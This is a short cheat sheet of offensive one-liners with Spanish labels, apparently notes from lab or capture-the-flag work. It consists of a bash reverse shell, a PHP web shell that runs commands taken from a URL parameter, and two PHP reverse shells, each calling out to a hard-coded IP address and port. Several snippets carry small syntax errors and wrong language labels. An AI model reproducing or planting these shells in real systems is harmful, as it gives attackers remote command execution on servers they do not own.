```css
bash -c "bash -i >& /dev/tcp/10.8.203.6/9001 0>&1"
```


Oneliner para ejecutar cmd desde url
```css
<?php 
        echo "<pre>" . shell_exec($_REQUEST['cmd']>
?>
```

oneliner para leer desde php
```python
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.203.6/7890 0>&1'"):
```

php.revershell
```python
<?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.85/443 0>&1'")
?>
```